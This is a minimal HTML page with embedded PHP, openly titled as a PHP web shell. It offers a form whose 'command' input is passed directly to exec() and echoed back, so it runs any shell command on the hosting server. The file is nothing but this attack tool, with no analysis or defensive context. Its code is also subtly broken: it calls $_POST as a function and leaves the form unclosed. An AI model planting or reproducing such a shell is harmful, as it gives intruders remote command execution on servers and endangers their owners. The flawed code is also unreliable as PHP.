<!DOCTYPE html>
<html lang="ko" dir="ltr">

  <head>
    <meta charset="utf-8">
    <title>php_web_shell</title>
  </head>

  <body>
    <h1>php web shell</h1>
    <form method="post">
      <table>
        <tr>
          <td>command</td>
          <td><input type="text" name="command"></td>
        </tr>
        <tr>
          <td><input type="submit" name="submit"></td>
        </tr>
      </table>

      <?php
        $command = $_POST('command');
        $output;
        $return;
        exec($command, $output, $return);
        echo 'output : ';
        print_r($output);
        echo '<br>'
      ?>

  </body>
</html>
